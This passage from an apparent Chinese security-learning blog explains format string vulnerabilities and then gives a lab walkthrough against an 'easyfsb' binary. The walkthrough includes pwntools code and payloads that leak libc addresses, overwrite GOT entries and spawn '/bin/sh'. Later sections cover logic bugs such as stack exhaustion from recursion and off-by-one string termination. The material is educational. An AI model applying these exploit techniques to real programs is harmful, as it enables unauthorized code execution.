<li>  可以忽略或者是<code>n$</code>，n表示是参数列表的第n个参数，通过这种形式直接访问第n个参数；</li>
</ul>
</li>
<li><p>flags</p>
<ul>
<li>  用于调整输出和打印的符号、空白、小数点、八进制和十六进制前缀等；</li>
</ul>
</li>
<li><p>fieldwidth</p>
<ul>
<li>  限制显示数值的最小宽度，当输出字符个数不足限制的宽度时，默认用空格填充，或者flags中的其他填充方式，超过限制宽度不会截断，正常显示；</li>
</ul>
</li>
<li><p>precision</p>
<ul>
<li>  输出的最大长度；</li>
</ul>
</li>
<li><p>length</p>
<ul>
<li>指浮点型参数或者整形参数的长度；<ul>
<li>  hh：1-byte；</li>
<li>  h：2-byte；</li>
<li>  l：4-byte；</li>
<li>  ll：8-byte；</li>
</ul>
</li>
</ul>
</li>
<li><p>type</p>
<ul>
<li><p>转换说明符，用来说明所应用的转换类型，它是唯一必须的格式域；</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>d/i</td>
<td>有符号十进制整数</td>
</tr>
<tr>
<td>u</td>
<td>无符号十进制整数</td>
</tr>
<tr>
<td>x/X</td>
<td>以十六进制形式输出无符号整数(不输出前缀0x)</td>
</tr>
<tr>
<td>o</td>
<td>以八进制形式输出无符号整数(不输出前缀0)</td>
</tr>
<tr>
<td>s</td>
<td>字符串</td>
</tr>
<tr>
<td>c</td>
<td>字符</td>
</tr>
<tr>
<td>p</td>
<td>指针</td>
</tr>
<tr>
<td>n</td>
<td>不输出字符，把已经成功输出的字符个数写入对应的整型指针参数所指的变量</td>
</tr>
<tr>
<td>f/F</td>
<td>以小数形式输出单、双精度实数</td>
</tr>
<tr>
<td>e/E</td>
<td>以指数形式输出单、双精度实数</td>
</tr>
<tr>
<td>g/G</td>
<td>以%f%e中较短的输出宽度输出单、双精度实数，%e格式在指数小于-4或者大于等于精度时使用</td>
</tr>
<tr>
<td>a/A</td>
<td>浮点数、十六进制数字和p-计数法</td>
</tr>
</tbody></table>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>格式化字符串函数是根据格式化字符串函数来进行解析的，那么相应的要被解析的参数的个数也自然是由这个<strong>格式化字符串</strong>所控制；</p>
<p>根据<strong>cdecl的调用约定</strong>，在进入printf()函数之前，将参数从右到左依次压栈。进入printf()之后,函数首先获取第一个参数，一次读取一个字符。如果字符不是<code>%</code>，字符直接复制到输出中；否则，读取下一个非空字符，获取相应的参数并解析输出。<br>格式化字符串的参数与后面实际提供的是一一对应的，就不会出现什么问题，但如果在格式化字符串多加几个格式化字符的时候，程序会怎么办呢？此时其可以正常通过编译，并且在栈上取值，按照给的格式化字符来解析对应栈上的值，发生了<strong>格式化字符串漏洞</strong>。</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225104238.png" style="zoom:40%;">

<h2 id="格式化字符串利用方法"><a href="#格式化字符串利用方法" class="headerlink" title="格式化字符串利用方法"></a>格式化字符串利用方法</h2><h3 id="泄漏内存地址"><a href="#泄漏内存地址" class="headerlink" title="泄漏内存地址"></a>泄漏内存地址</h3><p>通过格式化字符串漏洞能够对栈中的数据进行泄露；</p>
<p>示例：如下程序只提供了format参数，却没有提供其他参数，编译并运行此程序会导致内存数据泄漏；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* fs_read */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%08x\n%08x\n%08x\n"</span>)</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225105921.png" style="zoom:50%;">

<p>分析：</p>
<ul>
<li>  printf按照format的要求，输出了3个数值，但这些数值并不是输入的参数，而是保存在栈中的数值，打印出的这三个字符串正是位于format参数之后的数据；</li>
</ul>
<p>gdb调试分析：</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225111728.png" style="zoom:30%;">

<p>format参数的地址为<code>0x80484c0</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225111913.png" style="zoom:30%;">

<p>栈中format地址后的三个地址的值分别为<code>0xffffd694</code>、<code>0xffffd69c</code>、<code>0x8048461</code>；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225112418.png" style="zoom:33%;">

<h3 id="覆写内存"><a href="#覆写内存" class="headerlink" title="覆写内存"></a>覆写内存</h3><p>覆盖内存通常其实就是改写内存，包括<strong>改写栈上的内存和任意地址的内存</strong>，从而来控制程序的执行流程；</p>
<p>示例，程序如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* fs_write */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> flag = <span class="number">0xbabe</span>;</span><br><span class="line"><span class="type">int</span> flag_addr = <span class="number">0x804a028</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> i,write_byte,already_write;</span><br><span class="line">    <span class="type">int</span> value = <span class="number">0xbeef</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> format[<span class="number">256</span>]={<span class="number">0</span>};</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>]={<span class="number">0</span>};</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag:%#x\n"</span>,flag);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">strcpy</span>(format,<span class="string">"\x28\xa0\x04\x08"</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(format,<span class="string">"\x29\xa0\x04\x08"</span>); </span><br><span class="line">    </span><br><span class="line">    already_write=<span class="number">8</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++){</span><br><span class="line">        <span class="keyword">if</span>(value&gt;&gt;(<span class="number">8</span>*i)==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        write_byte = value&gt;&gt;(<span class="number">8</span>*i)&amp;<span class="number">0xff</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">sprintf</span>(buf,<span class="string">"%%%dc%%%d$hhn"</span>,(write_byte-already_write+<span class="number">0x100</span>)%<span class="number">0x100</span>,<span class="number">11</span>+i);</span><br><span class="line">        already_write+=(write_byte-already_write)%<span class="number">0x100</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(format,buf);</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"flag:%#x\n"</span>,flag);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<p>上述程序演示了利用格式化字符串漏洞修改flag变量的值：flag的初值为0xbabe，利用格式化字符串漏洞，修改为0xbeef；</p>
<p>复写内存的核心功能在<code>printf(format)</code>中实现，具体的思路是：</p>
<ul>
<li>  首先在格式化字符串中放入flag变量的地址；</li>
<li>  然后利用<code>$</code>来指定这个地址位于第几个参数；</li>
<li>  最终使用<code>%n</code>(即hhn)向这个参数所指向的地址处写入数据；</li>
</ul>
<p>分析：</p>
<ul>
<li><p>首先strcpy()函数利用IDA事先分析后获取的flag变量地址，拷贝给format：</p>
<ul>
<li><p>使用IDA事先查看flag的地址为<code>0x804a028</code>，由于要向flag中写入<code>0xbeef</code>，也就是说要向<code>0x804a028</code>和<code>0x804a029</code>两个地址中写入内容，因此将这两个地址放入到format中；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225140226.png" style="zoom:40%;">

</li>
<li><p>  <code>strcpy(format,"\x28\xa0\x04\x08");</code></p>
</li>
<li><p>  <code>strcat(format,"\x29\xa0\x04\x08");</code></p>
</li>
</ul>
</li>
<li><p>然后确定写在format数组里的两个地址属于printf的第几个参数，通过gdb进行调试，在printf(format)处设置断点进行查看；</p>
<ul>
<li><p>下图所示，format的地址为<code>0xffffd3dc</code>，是printf的第11个参数，即<code>(0xffffd3dc-0xffffd3b0)/4=11</code>，由于flag的两个地址写在了format最开始 的位置，因此它们分别是printf的第11和第12个参数；</p>
<p>  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225140630.png"></p>
</li>
</ul>
</li>
<li><p>最后利用<code>%n</code>(即hhn)向flag的两个地址中进行写入；</p>
<ul>
<li>由于<code>%n</code>是将之前打印的所有字符数写入到某一地址中，所以要计算好打印的字符数,这里构造格式化字符串的格式如下：<ul>
<li>  <code>% width c % num $ hhn % width c % num $ hhn</code></li>
<li>  通过for语句的两轮循环，写入两轮<code>% width c % num $ hhn</code>；</li>
<li>  <code>hhn</code>表示每次写入一个字节到地址中；</li>
</ul>
</li>
<li>分析<code>% width c % num $ hhn</code>；<ul>
<li>width用来计算正确的值以写入到<code>%hhn</code>中；<ul>
<li>计算width是通过已写入的字节数和要写入的值进行计算；<ul>
<li>  例如，为了写入<code>0xef</code>到指定地址，由于在format数组的起始部分已经写入了8字节的flag地址，所以应该再填充<code>0xef-8</code>个字节(<code>ef</code>转成10进制为239再减8为231，即算写入的字符个数)；同理，写入<code>0xbe</code>时要减去前面写过的<code>0xef</code>长度，得到需要填充的长度，为了防止这个数负值，加上<code>0x100</code>再取模；</li>
</ul>
</li>
<li>  num指定写入到第几个参数，在上一步已经确认了是第11和12个；</li>
<li>  hhn表示每次写入一个字节到地址中；</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>最终format中的内容为</p>
<p>  <code>\x28\xa0\x04\x08\x29\xa0\x04\x08%231c%11$hhn%207c%12$hhn</code>；</p>
<ul>
<li><p>通过gdb调试来进行验证，查看format数组地址上的内容，已经覆写；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225141559.png" style="zoom:40%;"></li>
<li><p>对应到栈中验证参数的位置，为原参数；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142155.png" style="zoom:30%;"></li>
<li><p>执行printf(format)后，查看flag地址的内容改为了<code>0xbeef</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142348.png" style="zoom:33%;">

</li>
<li><p>执行程序，flag的值被修改为<code>0xbeef</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225142610.png" style="zoom:33%;"></li>
</ul>
</li>
</ul>
<p>由此可见，格式化字符串漏洞还能对内存进行覆写，如果程序中用到了类似本例中的<code>printf(format)</code>，就极有可能造成格式化字符串漏洞；</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ol>
<li><p>用IDA对easyfsb程序进行分析，函数逻辑比较简单，在main函数调用了getname函数；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144355.png" style="zoom:50%;"></li>
<li><p>查看getname()函数，发现<code>print(&amp;buf)</code>，存在格式化字符串漏洞；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144437.png" style="zoom:50%;"></li>
<li><p>由于程序编译时会采用两种表进行辅助，一个为PLT表，一个为GOT表，这两个表是一一对应的，看到带有**@plt**标志的函数时，这个函数其实就是个过渡作用，可以通过PLT表跳转到GOT表来得到函数真正的地址；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225144700.png" style="zoom:40%;"></li>
</ol>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><ol>
<li> 将exit函数的GOT表地址覆写为main函数的地址，程序每次退出时将再返回到main函数；</li>
<li> 通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址；</li>
<li> 用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf 中写入<code>/bin/sh</code>，当执行<code>printf(buf)</code>时，相当于执行<code>system('/bin/sh')</code>；</li>
</ol>
<h2 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h2><ol>
<li><p>将exit函数的GOT表地址覆写为main函数的地址</p>
<ol>
<li><p>覆写思路分析</p>
<p> 覆写的格式为：<code>% width c % num $ hhn</code>，其中width是将要写入到<code>$hhn</code>参数中的值，它由覆写的值和已经写入的长度决定，具体为：**(已写入的长度-覆写的值 )%0x100**；</p>
<p> num定了要写入的第num个参数，需要通过调试具体分析一下；</p>
</li>
<li><p>使用gdb调试，在main和printf处设置断点；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225145622.png" style="zoom:50%;"></li>
<li><p>运行到printf处，可以看到buf的地址为<code>0xffffd54c</code>，是printf中格式化字符串的第7个参数，即:<code>(0xffffd54c-0xffffd530)/4 = 7</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225145853.png" style="zoom:40%;"></li>
<li><p>num的确定；</p>
<ul>
<li>  因为要把exit的GOT地址覆写为main函数地址，即<code>0x8048648</code>，所以应写入四个字节，即重复四次<code>% width c % num $ hhn</code>；</li>
<li>  粗略估计width最多占用3个字节，num最多占用2个字节，则每个格式<code>% widthc % num $ hhn</code>占用12个字节，四次重复共48个字节，占用48/4=12个参数；</li>
<li>  由于buf是从第7个参数开始，写入的地址从第7+12=19个参数开始，num依次为19、20、21、22；</li>
</ul>
</li>
<li><p>确定<code>exit@got</code>的地址；</p>
<ol>
<li><p>查看main函数的汇编指令，第一条指令的地址即为main函数的地址，即<code>0x0848648</code>，最后一条指令为exit函数的plt表的地址:<code>0x8048480</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225150637.png" style="zoom:40%;"></li>
<li><p>查看<code>0x8048480</code>处的汇编指令，第一条为跳转指令，直接跳转到<code>0x804a024</code>，此地址即为exit函数got表的地址；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225150919.png" style="zoom:40%;"></li>
<li><p>通过查看<code>0x804a024</code>出的内存数据，可以看到第一条地址<code>0x08048486</code>即为exit函数的真正地址；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225151137.png" style="zoom:40%;"></li>
</ol>
</li>
<li><p>构造格式化字符串:</p>
<p> 确定了num和width，也确定了exit函数的got表地址为<code>0x804a024</code>，所以将要覆盖的exit@got地址<code>0x804a024</code>、<code>0x804a025</code>、<code>0x804a026</code>、<code>0x804a027</code>依次写入到第19、20、21、22个参数中，格式化字符串就构造好了：</p>
<p> <code>%72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\x24\xa0\x04\x08\x25\xa0\x04\x08\x26\xa0\x04\ x08\x27\xa0\x04\x08</code></p>
</li>
<li><p>编写<code>generate_format(addr, value)</code>函数构造格式化字符串，addr为要覆写的地址，value为覆写的值，函数代码如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#generate format string</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_format</span>(<span class="params">addr, value</span>):</span><br><span class="line">        payload = <span class="string">''</span></span><br><span class="line">        print_count = <span class="number">0</span></span><br><span class="line">        addr_part = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; (<span class="number">8</span>*i)) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            one_byte = (value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span></span><br><span class="line">            payload += <span class="string">'%{0}c%{1}$hhn'</span>.<span class="built_in">format</span>((one_byte - print_count) % <span class="number">0x100</span>, <span class="number">19</span> + i)</span><br><span class="line">            print_count += (one_byte - print_count) % <span class="number">0x100</span> </span><br><span class="line">            addr_part += p32(addr + i)</span><br><span class="line">        payload = payload.ljust(<span class="number">48</span>, <span class="string">'a'</span>)</span><br><span class="line">        payload += addr_part</span><br><span class="line">        <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure></li>
<li><p>调用<code>generate_format(exit_got,main)</code>函数，生成的payload作为输入，执行后可以看到exit的got表的第一个地址被覆盖为main函数的地址，即<code>0x08048648</code>；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225152237.png" style="zoom:40%;"></li>
</ol>
</li>
<li><p>获取system函数的地址</p>
<ol>
<li><p>获取思路分析</p>
<p> 由于格式化字符串漏洞能够泄露内存关键数据，可以考虑利用这个漏洞泄露system 的地址，利用格式化字符串漏洞，泄露出GOT表中puts的地址，再利用libc中system函数与puts函数的偏移，计算出system地址；</p>
</li>
<li><p>先获取puts函数的got表地址，类似于查看exit函数的got表地址，所以puts函数got表的地址为<code>0x804a01c</code>，虽然可以直接查看<code>0x804a01c</code>内容即可得到puts函数的实际地址，这里使用格式化字符串漏洞来获取；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225153759.png" style="zoom:40%;"></li>
<li><p>构造格式化字符串</p>
<ol>
<li><p> 构造的格式化字符串格式为：<code>%num$s+puts@got</code>，即把puts@got的地址写入 buf，再通过<code>%s</code>读出；</p>
</li>
<li><p> 其中<code>%num$s</code>占4个字节，是第7个参数；puts@got占4个字节，是第8个参数，num就可以写为8，即将puts@got的地址写入到第8个参数的位置；</p>
</li>
<li><p> 获取了puts的实际地址后，通过libc中两个函数的偏移即可得到system的地址，通过查阅资料可以得到libc的库的位置为<code>/lib/i386-linux-gnu/libc.so.6</code>；</p>
</li>
<li><p>完整代码如下</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#get sys_addr through puts_addr</span></span><br><span class="line">p.recvuntil(<span class="string">'Welcome~\n'</span>)</span><br><span class="line">payload = <span class="string">'%8$s'</span>+p32(puts_got)	<span class="comment">#format string to output puts_addr</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))	<span class="comment">#get puts_addr</span></span><br><span class="line">log.info(<span class="string">'puts:%#x'</span>%puts_addr)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>)	<span class="comment">#libc.so location</span></span><br><span class="line">sys_addr = puts_addr - (libc.symbols[<span class="string">'puts'</span>]-libc.symbols[<span class="string">'system'</span>])</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
</li>
<li><p>覆写got表中printf的地址</p>
<p> 原理与覆写exit函数GOT表相同，调用<code>generate_format(printf@got,system_addr)</code>，生成的payload作为输入，代码如下：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#overwrite printf_got with system addr</span></span><br><span class="line">p.recvuntil(<span class="string">'Welcome~\n'</span>)</span><br><span class="line">payload = generate_format(printf_got,sys_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure></li>
<li><p>执行<code>system('/bin/sh')</code></p>
<ol>
<li><p>此时GOT表中printf地址已被覆写为system地址，在buf中输入<code>/bin/sh</code>，执行<code>printf(buf)</code>时，相当于执行<code>system('/bin/sh')</code>，最后代码如下:</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#system('/bin/sh')</span></span><br><span class="line">p.recvuntil(<span class="string">'Welcome~\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
<li><p>运行编写的python代码，成功拿到shell权限；</p>
 <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210225154548.png" style="zoom:40%;"></li>
</ol>
</li>
</ol>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/7398">https://xz.aliyun.com/t/7398</a></p>
<p>备注：<a href="https://github.com/Leeyuxun/Binary-Experiment-Program">实验程序下载</a></p>
]]></content>
      <categories>
        <category>二进制学习</category>
      </categories>
      <tags>
        <tag>格式化字符串</tag>
      </tags>
  </entry>
  <entry>
    <title>二进制-逻辑漏洞</title>
    <url>/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E.html</url>
    <content><![CDATA[<h1 id="逻辑漏洞成因"><a href="#逻辑漏洞成因" class="headerlink" title="逻辑漏洞成因"></a>逻辑漏洞成因</h1><p>逻辑漏洞是指那些在程序中，因代码逻辑不正确而引发的漏洞；<span id="more"></span></p>
<p>逻辑漏洞成因：</p>
<ul>
<li>产生于程序设计不够细致，或编码不够严谨的地方；<ul>
<li>  当程序体量较为庞大，分支结构较为复杂的时候，不太常用到的分支结构就往往得不到足够的重视，设计和编码也就难以得到保障，导致很可能存在逻辑漏洞；</li>
</ul>
</li>
<li>发生在频繁变更的程序段上；<ul>
<li>  如因需求的频繁变更，或因执行出现的bug等问题，需要对程序进行修改的时候，往往是没有足够的时间重头开始进行设计，也不容易分析全与其他部分之间的关联；</li>
<li>  因此，在编码过程中，就很可能存在与其他部分出现冲突，或不匹配的情况，很可能会存在逻辑漏洞；</li>
</ul>
</li>
<li>合作出现问题，大型的程序或系统往往是由多人、多团队协作完成的；<ul>
<li>  由于不同的人，对不同的功能存在不同的理解，以及各种原因导致的交流不畅，都会影响到各模块之间的协调和整体的安全性；</li>
</ul>
</li>
<li>不严谨的边界判别<ul>
<li>出现情况往往是在<code>&gt;</code>与<code>&gt;=</code>、<code>&lt;</code>与<code>&lt;=</code>的误用，或字符串的长度判别情况；<ul>
<li>  边界值被算入判别条件或把边界值漏掉，可能导致循环多进行一轮，或者将本不该放过判别条件的值放过判别条件；</li>
<li>  字符串的长度判别举例，一个长为16个字符的字符串，所占的空间为字符串数组下标为0-15，第16个下标为字符串结束符，因而需要17个空间进行存储；</li>
</ul>
</li>
<li>指针与引用的误用<ul>
<li>  指针与引用均是用于间接的使用其他对象，这就导致指针与引用的误用，这种误用往往出现在函数的调用，如在scanf函数中，参数为数据的引用，误将其用为指针的话，就会出现错误；</li>
</ul>
</li>
</ul>
</li>
<li>递归爆段<ul>
<li>  递归是函数自身调用自身的一种情况，如果这个调用自身的过程过于深入，而一直没有结果返回，则容易发生递归爆栈，这也是逻辑的漏洞，是函数的功能、数据处理不当造成的；</li>
</ul>
</li>
</ul>
<h1 id="递归暴栈逻辑漏洞"><a href="#递归暴栈逻辑漏洞" class="headerlink" title="递归暴栈逻辑漏洞"></a>递归暴栈逻辑漏洞</h1><h2 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h2><p>由于系统会在每次调用函数时为函数安排一个栈空间，并在函数结束时回收这个空间；</p>
<p>如果函数迟迟不返回，这个空间就迟迟回收不回来；</p>
<p>而不断的自身调用自身，就导致这个空间不断的被分配，直到这个空间被分配完，就造成了爆栈；</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>对如下程序进行递归分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* recursion10 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> i)</span>{</span><br><span class="line">    <span class="keyword">if</span> (i&gt;<span class="number">0</span>){</span><br><span class="line">        i--;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">        func(i);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0x10</span>;</span><br><span class="line">    func(i);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ul>
<li><p>首先在进入main函数的<code>mov rbp,rsp</code>处下一个断点， 查看栈帧情况；其次在第一次调用func函数，和第二次调用func函数的地方下两个断点；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303210257.png" style="zoom:50%;"></li>
<li><p>程序在main函数开始时的栈顶指针和栈底指针均为<code>0x7fffffffde70</code>地址；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303210422.png" style="zoom:50%;"></li>
<li><p>然后将程序运行到第一次调用函数func，此时栈顶指针为<code>0x7fffffffde60</code>,栈低指针为<code>0x7fffffffde70</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303210453.png" style="zoom:50%;"></li>
<li><p>接下来进入func函数内部，运行到第 一次递归调用func函数时，查看此时的栈帧情况，栈顶指针为<code>0x7fffffffde40</code>地址，栈底指针为<code>0x7fffffffde50</code>地址；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303215719.png" style="zoom:50%;"></li>
<li><p>  通过对两次递归调用时的栈帧情况的分析，可以发现每次递归调用消耗<code>0x20</code>的栈空间，栈帧逐渐向低地址发展；</p>
</li>
<li><p>  随着递归的不断深入，栈帧会逐渐减小，直到超过临界值，导致爆栈；</p>
</li>
</ul>
<p>将递归深度改为<code>0x100000</code>，在gdb加载后运行程序，可以看到程序运行发生了递归爆栈错误；</p>
<img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303222828.png" style="zoom:50%;">

<h1 id="不严谨的边界判别"><a href="#不严谨的边界判别" class="headerlink" title="不严谨的边界判别"></a>不严谨的边界判别</h1><h2 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h2><ul>
<li>  错误使用<code>&gt;=</code>与<code>&gt;</code>、<code>&lt;=</code>与<code>&lt;</code>；</li>
<li>  忽视数组下标以0开始；</li>
<li>  忽视字符串最后结束符；</li>
</ul>
<h2 id="后果"><a href="#后果" class="headerlink" title="后果"></a>后果</h2><ul>
<li>  放过不该放过的叛别情况；</li>
<li>  程序变得难以预料；</li>
<li>  数据泄露；</li>
</ul>
<h2 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h2><p>对以下程序进行分析；</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* lossly_border */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>{</span><br><span class="line">    <span class="type">char</span> s[<span class="number">20</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> c=<span class="string">'c'</span>;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">        s[i]=c;</span><br><span class="line">    <span class="type">int</span> slen = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,slen);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure>

<ul>
<li><p>  分析程序用于一个申请长度为20个字符的字符串中添加进20个字符，然后打印出字符串长度；</p>
</li>
<li><p>运行程序，发现输出的结果长度为22，与预期的长度20不符；</p>
  <img src="/Users/leeyuxun/Library/Application Support/typora-user-images/image-20210303223556667.png" alt="image-20210303223556667" style="zoom:50%;"></li>
<li><p>使用gdb调试，找到字符串存储位置，发现字符串的开始地址是参数<code>rbp-0x20</code>；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303225032.png" style="zoom:50%;"></li>
<li><p>查看其中的值，即长度计算将栈上其他数值也计算了进去，此时打印字符串内容也会将这个值打出来；</p>
  <img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20210303225318.png" style="zoom:50%;"></li>
<li><p>  <code>0x63</code>即为存储的字符<code>c</code>，可以看到存储了20个<code>c</code>字符。但接下来并没有字符串结束符，而是原先栈中数据<code>0xff7f0000</code>(这是因为是小端存储模式)，所以<code>strlen()</code>函数在判别字符串长度的时候就把<code>0xff</code>和<code>0x7f</code>也一同算进去了，造成了字符串长度出现错误；</p>
</li>
</ul>
<h1 id="与-的误用"><a href="#与-的误用" class="headerlink" title="==与=的误用"></a><code>==</code>与<code>=</code>的误用</h1><h2 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h2><p><code>==</code>是常见的判别符号，<code>=</code>由于与<code>==</code>相近很容易被当做<code>==</code>使用；</p>
<h2 id="后果-1"><a href="#后果-1" class="headerlink" title="后果"></a>后果</h2><ul>
<li>  if(i==1)表示如果i等于1执行；</li>
<li>  而if(i=1)则是给i赋值为1，1为返回的值；</li>
</ul>
